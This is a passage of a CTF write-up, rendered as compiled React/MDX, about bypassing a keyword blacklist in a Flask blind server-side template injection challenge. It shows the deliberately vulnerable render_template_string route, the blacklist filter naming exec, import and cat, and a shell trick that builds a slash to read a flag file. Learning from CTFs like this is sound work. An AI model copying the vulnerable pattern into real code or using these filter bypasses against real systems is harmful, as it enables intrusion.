keyword\",children:\"is\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"None\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\tpayload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'payload'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" check_filter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\trender_template_string\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'I believe you can overcome this difficulty \u003e\u003c'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'miss params'\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Now let\\u2019s start fun part and check how it\\u2019s validating the payload.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"I got a bit cocky at first sight and thought this was a typical blind SSTI and rushed copying one of my go-to SSTI payloads and then noticed that \",(0,n.jsx)(e.code,{children:\"request\"}),\"/\",(0,n.jsx)(e.code,{children:\"join\"}),\"/\",(0,n.jsx)(e.code,{children:\"attr\"}),\"/\",(0,n.jsx)(e.code,{children:\"print\"}),\" was filtered and gave up on the typical payloads at this point.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` string\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"UNALLOWED \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'class'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'mro'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'init'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'builtins'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'request'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'app'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'sleep'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'add'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'+'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'config'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'subclasses'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'format'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'dict'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'get'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'attr'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'globals'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'time'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'read'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'import'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'sys'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cookies'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'headers'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'doc'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'url'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'encode'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'decode'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'chr'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ord'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'replace'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'echo'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'base'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'self'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'template'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'print'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'exec'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'response'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'join'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cat'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'%s'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'\\\\\\\\'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'*'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u0026'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"{{\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"}}\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'[]'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`\"''\"`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`'\"\"'`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'|'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'='\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'~'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"check_filter\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"lower\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'.'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"':'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"115\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" char \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" char \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" string\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"digits\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" UNALLOWED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Now let\\u2019s find out what\\u2019s going on here.\"}),`\n`,(0,n.jsx)(e.p,{children:\"The first thing to notice is the first if statement, we\\u2019ll need only one of these to be true to get past it due to the usage of the OR operator.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Which I wish I have noticed earlier, as I was trying to forge \",(0,n.jsx)(e.code,{children:\"/\"}),\" with \",(0,n.jsx)(e.code,{children:\"${PWD%${PWD#?}}\"}),\" and ended up giving up on it because it was ending with \",(0,n.jsx)(e.code,{children:\"}}\"}),\" and limited length.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"language-sh code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:'$ cat \"${PWD%${PWD#?}}\"flag\\n'}),(0,n.jsx)(e.span,{className:\"code-line\",children:`crew{fakeflag}$\n`})]})}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'.'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"':'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Also, a thing to keep in mind the length limit. so we need to have a limited payload size.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"115\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Moreover, We can\\u2019t use digits so we can\\u2019t bypass the blacklist with Unicode.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" char \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" string\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"digits\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Finally, the blacklist.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"UNALLOWED \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'class'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'mro'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'init'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'builtins'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'request'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'app'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'sleep'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'add'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'+'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'config'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'subclasses'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'format'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'dict'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'get'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'attr'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'globals'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'time'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'read'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'import'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'sys'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cookies'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'headers'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'doc'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'url'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'encode'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'decode'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'chr'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ord'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'replace'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'echo'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'base'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'self'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'template'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'print'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'exec'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'response'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'join'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'cat'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'%s'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'\\\\\\\\'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'*'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u0026'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"{{\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"}}\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'[]'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`\"''\"`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`'\"\"'`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'|'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'='\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'~'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"I\\u2019ve added few debugging \",(0,n.jsx)(e.code,{children:\"print\"}),\"s and an input to the filter to test the payloads that I create.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token 